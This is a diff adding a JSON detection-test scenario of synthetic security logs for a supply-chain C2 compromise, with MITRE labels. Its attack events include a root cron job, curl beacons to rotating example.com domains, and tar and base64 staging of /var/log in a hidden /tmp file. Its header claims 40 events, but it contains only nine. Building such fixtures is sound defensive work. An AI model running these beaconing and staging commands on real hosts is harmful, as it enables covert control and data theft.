@@ -1,0 +1,19 @@
+{
+  "scenario_name": "supply_chain_c2",
+  "description": "Supply chain compromise: malicious cron job beaconing to C2 and staging data",
+  "attack_techniques": ["T1053.003", "T1071.001", "T1568.002", "T1560.001"],
+  "kill_chain_phases": ["persistence", "command_and_control", "collection"],
+  "total_events": 40,
+  "attack_events": 15,
+  "events": [
+    {"@timestamp": "2026-03-01T03:00:00Z", "process.name": "crontab", "process.parent.name": "bash", "user.name": "root", "host.hostname": "app01", "process.command_line": "crontab -e", "event.action": "process_started", "is_attack": true, "attack_technique": "T1053.003", "attack_phase": "persistence"},
+    {"@timestamp": "2026-03-01T03:05:00Z", "process.name": "curl", "process.parent.name": "cron", "user.name": "root", "host.hostname": "app01", "destination.ip": "45.33.32.156", "destination.domain": "xr7f9k2m.example.com", "process.command_line": "curl -s http://xr7f9k2m.example.com/check", "event.action": "process_started", "is_attack": true, "attack_technique": "T1071.001", "attack_phase": "command_and_control"},
+    {"@timestamp": "2026-03-01T03:10:00Z", "process.name": "curl", "process.parent.name": "cron", "user.name": "root", "host.hostname": "app01", "destination.ip": "45.33.32.156", "destination.domain": "a8bk3p1.example.com", "process.command_line": "curl -s http://a8bk3p1.example.com/check", "event.action": "process_started", "is_attack": true, "attack_technique": "T1568.002", "attack_phase": "command_and_control"},
+    {"@timestamp": "2026-03-01T03:15:00Z", "process.name": "curl", "process.parent.name": "cron", "user.name": "root", "host.hostname": "app01", "destination.ip": "45.33.32.156", "destination.domain": "q2m8x4.example.com", "process.command_line": "curl -s http://q2m8x4.example.com/check", "event.action": "process_started", "is_attack": true, "attack_technique": "T1568.002", "attack_phase": "command_and_control"},
+    {"@timestamp": "2026-03-01T03:20:00Z", "process.name": "tar", "process.parent.name": "sh", "user.name": "root", "host.hostname": "app01", "process.command_line": "tar czf /tmp/.staging.tar.gz /var/log", "event.action": "process_started", "is_attack": true, "attack_technique": "T1560.001", "attack_phase": "collection"},
+    {"@timestamp": "2026-03-01T03:20:10Z", "process.name": "base64", "process.parent.name": "sh", "user.name": "root", "host.hostname": "app01", "process.command_line": "base64 /tmp/.staging.tar.gz", "event.action": "process_started", "is_attack": true, "attack_technique": "T1560.001", "attack_phase": "collection"},
+    {"@timestamp": "2026-03-01T03:01:00Z", "process.name": "systemd-journal", "process.parent.name": "systemd", "user.name": "root", "host.hostname": "app01", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-01T03:02:00Z", "process.name": "logrotate", "process.parent.name": "cron", "user.name": "root", "host.hostname": "app01", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-01T03:03:00Z", "process.name": "apt", "process.parent.name": "cron", "user.name": "root", "host.hostname": "app01", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null}
+  ]
+}
